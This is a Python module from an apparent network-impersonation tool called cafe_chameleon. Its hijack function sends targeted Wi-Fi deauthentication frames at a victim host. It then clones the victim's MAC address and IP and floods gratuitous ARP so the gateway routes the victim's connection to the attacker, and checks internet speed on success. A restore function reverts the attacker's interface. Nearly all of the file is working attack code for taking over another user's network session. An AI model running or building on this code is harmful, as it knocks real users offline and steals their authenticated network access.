"""
cafe_chameleon.network.hijack - Network host impersonation and restoration procedures.
"""

import re
import time

from cafe_chameleon.utils.signals import HijackSkipInterrupt
from cafe_chameleon.utils.process import _run
from cafe_chameleon.ui.console import log_info, log_plus, log_hijack
from cafe_chameleon.network.sysfs import wait_for_carrier, get_carrier_status
from cafe_chameleon.network.nmcli import get_active_profile
from cafe_chameleon.network.mac import set_mac_address, reset_mac_address
from cafe_chameleon.network.arp import send_gratuitous_arp, start_background_garp
from cafe_chameleon.network.deauth import send_deauth
from cafe_chameleon.network.internet import has_internet, test_internet_speed


def restore(interface: str, macaddress: str, ipmask: str, broadcast: str, gateway: str, profile: str | None = None) -> None:
    """Refined, fast network restoration procedure with link carrier synchronization and full NM cleanup."""
    log_info(f"Restoring original MAC ({macaddress}) and IP settings for interface {interface}...")

    active_profile = profile or get_active_profile()
    if active_profile:
        _run(["nmcli", "connection", "modify", active_profile, "802-11-wireless.bssid", ""], debug=False)
        _run(["nmcli", "connection", "modify", active_profile, "802-11-wireless.cloned-mac-address", ""], debug=False)

    reset_mac_address(interface, profile=active_profile)

    # Force physical interface MAC hardware reset via macchanger -p
    _run(f"ip link set dev {interface} down", debug=False)
    _run(f"macchanger -p {interface}", debug=False)
    _run(f"ip link set dev {interface} up", debug=False)

    # Wait deterministically for adapter hardware link ready state
    wait_for_carrier(interface, timeout=4.0)

    try:
        _run(f"ip addr flush dev {interface}")
        _run(f"ip addr add {ipmask} broadcast {broadcast} dev {interface}")
    except Exception:
        pass

    try:
        _run(f"ip route flush dev {interface}")
        if gateway:
            _run(f"ip route replace default via {gateway} dev {interface} onlink")
    except Exception:
        pass

    if active_profile:
        _run(["nmcli", "connection", "up", active_profile], debug=False, timeout=8.0)

    local_ip_only = ipmask.split("/")[0] if "/" in ipmask else ipmask
    if gateway and local_ip_only:
        try:
            send_gratuitous_arp(interface, local_ip_only, gateway)
        except Exception:
            pass

    log_plus("Successfully restored original network configuration.")


def hijack(interface: str, ip: str, mac: str, netmask: str, broadcast: str, gateway: str, max_retries: int = 2, timeout_per_retry: float = 4, profile: str | None = None, bssid: str | None = None, channel: int | None = None) -> bool:
    """
    High-reliability network connection procedure:
    1. Change MAC via NetworkManager (nmcli connection modify cloned-mac-address) & re-associate.
    2. Deterministically wait for link carrier / hardware readiness via sysfs polling.
    3. Flush old IP and assign target IP/netmask/broadcast.
    4. Flush old routes and set default gateway route.
    5. Send immediate Gratuitous ARP (-U and -A) to announce new MAC/IP to AP & Gateway.
    6. Verify interface state and check internet access.
    """
    log_hijack(f"[*] Impersonating host {ip} ({mac})...")
    active_profile = profile or get_active_profile()

    try:
        # 0. Send targeted Airgeddon MDK4 Amok 802.11 Deauth/Disassoc in Monitor Mode
        send_deauth(mac, bssid, interface, channel=channel)

        for attempt in range(1, max_retries + 1):
            # 1. Change MAC using NetworkManager nmcli cloned-mac-address (or fallback)
            if active_profile:
                log_hijack(f"[*] Setting cloned MAC address on NetworkManager profile '{active_profile}' to {mac}...")
            mac_ok = set_mac_address(interface, mac, profile=active_profile)
            if not mac_ok:
                log_hijack(f"\033[91m[-] [DIAGNOSTIC] Failed to set MAC address to {mac}\033[0m")

            # 5. Wait for carrier/link readiness
            carrier_ok = wait_for_carrier(interface, timeout=5.0, poll_interval=0.05)
            if not carrier_ok:
                log_hijack(f"\033[91m[-] [DIAGNOSTIC] Hardware link carrier not ready on {interface}\033[0m")

            # 6. Flush & set IPv4 address (force inet)
            _run(f"ip addr flush dev {interface} scope global")
            rc_ip, ip_err = _run(f"ip -4 addr add {ip}/{netmask} broadcast {broadcast} dev {interface}")
            if rc_ip != 0:
                log_hijack(f"\033[91m[-] [DIAGNOSTIC] Failed to assign IP {ip}/{netmask}: {ip_err.strip()}\033[0m")

            # 7. Set route
            try:
                _run(f"ip route flush dev {interface}")
                if gateway:
                    rc_rt, rt_err = _run(f"ip route replace default via {gateway} dev {interface} onlink")
                    if rc_rt != 0:
                        log_hijack(f"\033[91m[-] [DIAGNOSTIC] Failed to replace default route via {gateway}: {rt_err.strip()}\033[0m")
            except Exception as e:
                log_hijack(f"[-] [DIAGNOSTIC] Route exception: {e}")

            # 8. Rapid Gratuitous ARP & Start Background GARP Storm
            garp_stop_event = None
            if gateway:
                send_gratuitous_arp(interface, ip, gateway)
                garp_stop_event = start_background_garp(interface, ip, gateway)

            try:
                # 9. Verification loop
                start_time = time.time()
                verified = False
                last_mac_ok, last_ip_ok, last_conn_ok = False, False, False

                while time.time() - start_time < timeout_per_retry:
                    # Check MAC via sysfs and ip link
                    current_mac = None
                    try:
                        with open(f"/sys/class/net/{interface}/address", "r") as f:
                            current_mac = f.read().strip().lower()
                    except Exception:
                        rc, mac_out = _run(f"macchanger -s {interface}", debug=False)
                        m = re.search(r"Current MAC:\s+([0-9a-fa-f:]+)", mac_out, re.IGNORECASE)
                        if m:
                            current_mac = m.group(1).lower()
                    last_mac_ok = (current_mac == mac.lower()) if current_mac else False

                    # Check IP & link state
                    rc, if_out = _run(f"ip addr show dev {interface}", debug=False)
                    last_ip_ok = (f"inet {ip}/" in if_out) or (f"inet {ip} " in if_out)
                    last_conn_ok = ("UP" in if_out or "LOWER_UP" in if_out) and get_carrier_status(interface)

                    if last_mac_ok and last_ip_ok and last_conn_ok:
                        verified = True
                        break

                    time.sleep(0.2)

                if not verified:
                    log_hijack(
                        f"\033[91m[-] [DIAGNOSTIC] Interface verification failed (Attempt {attempt}/{max_retries}): "
                        f"MAC_OK={last_mac_ok} (Actual MAC: {current_mac or 'Unknown'}, Expected: {mac.lower()}), IP_OK={last_ip_ok}, CONN_OK={last_conn_ok}\033[0m"
                    )
                else:
                    log_hijack(f"[*] Interface state verified for {ip} ({mac}). Testing internet reachability...")
                    has_base = has_internet(timeout=1.0, check_speed=False)
                    if not has_base:
                        log_hijack(f"\033[91m[-] [DIAGNOSTIC] NO INTERNET REACHABILITY (Gateway/DNS ping failed)\033[0m")
                        return False

                    log_hijack(f"[*] Base internet reachable. Measuring throughput speed...")
                    is_fast, speed_val = test_internet_speed(timeout=1.5, min_speed_kbps=5.0)
                    if is_fast:
                        log_hijack(f"\033[92m[+] SUCCESS! Internet verified via {ip} ({mac}) - Speed: {speed_val:.1f} KB/s\033[0m")
                        return True
                    else:
                        if speed_val > 0:
                            log_hijack(f"\033[91m[-] [DIAGNOSTIC] SLOW INTERNET: Speed ({speed_val:.2f} KB/s) below 5.0 KB/s threshold\033[0m")
                        else:
                            log_hijack(f"\033[91m[-] [DIAGNOSTIC] UNRESPONSIVE INTERNET: HTTP test timed out (0.00 KB/s)\033[0m")
                        return False
            finally:
                if garp_stop_event:
                    garp_stop_event.set()

            if attempt < max_retries:
                time.sleep(0.5)
    except HijackSkipInterrupt:
        log_hijack(f"\033[93m[-] Ctrl+C pressed in Impersonation window! Skipping target host {ip} ({mac})...\033[0m")
        return False

    log_hijack(f"\033[91m[-] Failed to impersonate {ip} ({mac})\033[0m")
    return False
